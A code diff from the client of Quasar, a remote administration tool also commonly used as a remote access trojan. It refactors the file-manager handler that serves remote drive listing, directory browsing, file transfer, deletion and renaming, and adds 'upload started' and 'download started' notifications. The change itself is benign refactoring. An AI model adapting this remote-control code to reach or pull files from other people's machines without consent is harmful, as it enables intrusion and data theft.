@@ -16,7 +16,7 @@ using System.Threading;
 
 namespace Quasar.Client.Messages
 {
-    public class FileManagerHandler : IMessageProcessor, IDisposable
+    public class FileManagerHandler : NotificationMessageProcessor, IDisposable
     {
         private readonly ConcurrentDictionary<int, FileSplit> _activeTransfers = new ConcurrentDictionary<int, FileSplit>();
         private readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file downloads
@@ -52,7 +52,7 @@ namespace Quasar.Client.Messages
             }
         }
 
-        public bool CanExecute(IMessage message) => message is GetDrives ||
+        public override bool CanExecute(IMessage message) => message is GetDrives ||
                                                              message is GetDirectory ||
                                                              message is FileTransferRequest ||
                                                              message is FileTransferCancel ||
@@ -60,9 +60,9 @@ namespace Quasar.Client.Messages
                                                              message is DoPathDelete ||
                                                              message is DoPathRename;
 
-        public bool CanExecuteFrom(ISender sender) => true;
+        public override bool CanExecuteFrom(ISender sender) => true;
 
-        public void Execute(ISender sender, IMessage message)
+        public override void Execute(ISender sender, IMessage message)
         {
             switch (message)
             {
@@ -229,6 +229,7 @@ namespace Quasar.Client.Messages
                     using (var srcFile = new FileSplit(message.RemotePath, FileAccess.Read))
                     {
                         _activeTransfers[message.Id] = srcFile;
+                        OnReport("File upload started");
                         foreach (var chunk in srcFile)
                         {
                             if (_token.IsCancellationRequested || !_activeTransfers.ContainsKey(message.Id))
@@ -301,6 +302,7 @@ namespace Quasar.Client.Messages
                     }
 
                     _activeTransfers[message.Id] = new FileSplit(filePath, FileAccess.Write);
+                    OnReport("File download started");
                 }
 
                 if (!_activeTransfers.ContainsKey(message.Id))
